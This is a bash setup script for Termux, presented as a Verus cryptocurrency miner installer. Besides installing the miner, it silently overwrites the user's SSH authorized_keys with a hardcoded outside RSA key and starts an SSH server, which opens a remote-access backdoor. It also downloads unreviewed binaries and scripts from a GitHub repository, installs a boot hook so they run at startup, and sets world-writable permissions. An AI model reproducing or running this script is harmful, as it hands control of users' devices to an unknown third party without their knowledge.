#!/bin/bash
NC='\033[0m'
R='\033[0;31m'   #'0;31' is Red's ANSI color code
G='\033[0;32m'   #'0;32' is Green's ANSI color code
Y='\033[1;33m'   #'1;32' is Yellow's ANSI color code
B='\033[0;34m'   #'0;34' is Blue's ANSI color code
P='\033[0;35m'
LG='\033[1;32m'
LB='\033[1;34m'
LP='\033[1;35m'
LC='\033[1;36m'

echo -e "${LC}#############################################${NC}"
echo -e "${LC}#             ${LB}VERUS ${LP}Miner ${G}SETUP             ${LC}#${NC}"
echo -e "${LC}#                                           ${LC}#${NC}"
echo -e "${LC}#              v1.0 | by Ch3ckr             ${LC}#${NC}"
echo -e "${LC}#############################################${NC}"
yes | pkg update
yes | pkg upgrade
echo -e "${R}-> ${NC}Software Update: ${LG}COMPLETE${NC}"
yes | pkg install cronie termux-services libjansson wget nano screen nmap openssh
mkdir ~/.ssh
chmod 0700 ~/.ssh
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDOAPjnQbztXVnQDGl1Xqty7kFyTZY4MEJgCn6Et6vRpivHV+dMHyLnsCp2iAxDnh99ld9P8adVpwWdOaaUm3wzxzRFK+83ZZGGuFO6/BRzC8J0D4CFur++rVdC8zHhyaGKTVU/I10dpYwVfnfyYjhBoFhb8lnMp3SIkd56HnHJDuAWg6Cr31wvevUbulOHh6uOaBdvyyAJxY8ASHyPOEDDIlo+4/oirMudO0L46zTvxktmAby0ZwD4jOcUK2K52L0+Xe7zWBRnDtY9bKTLoJFQ9McSVzoVTsXxlvGIJmW0WGTPfLf/o3w5T+JiE1vJL2/S+A7YSMgo952fofGl6r6R" > ~/.ssh/authorized_keys
chmod 0600 ~/.ssh/authorized_keys
sshd 2>&1 > /dev/null 2>&1
echo -e "${R}-> ${NC}Starting SSHD: ${LG}COMPLETE${NC}"
mkdir -p ~/.termux/boot && mkdir ~/ccminer && cd ~/ccminer
echo -e "${R}-> ${NC}Creating Miner & Boot Folders: ${LG}COMPLETE${NC}"
wget https://raw.githubusercontent.com/btcdollar/nana/refs/heads/main/ccminer_a53 -O ~/ccminer/ccminer
wget https://raw.githubusercontent.com/btcdollar/nana/main/start.sh
wget https://raw.githubusercontent.com/btcdollar/nana/refs/heads/main/config.json
chmod +x ccminer start.sh
cd ~/.termux/boot
wget https://raw.githubusercontent.com/btcdollar/nana/main/boot_start
chmod -R 777 ~/.termux/boot
echo -e "${R}-> ${NC}Downloading config: ${LG}COMPLETE${NC}"
cd
rm ncc.sh
wget https://raw.githubusercontent.com/btcdollar/nana/main/ncc.sh
chmod 777 ncc.sh
mkdir ~/.cache
echo -e "${R}-> ${LB}VERUS ${NC}SETUP: ${LG}COMPLETE ${R}-> REBOOT${NC}"
sleep 5
su -c reboot
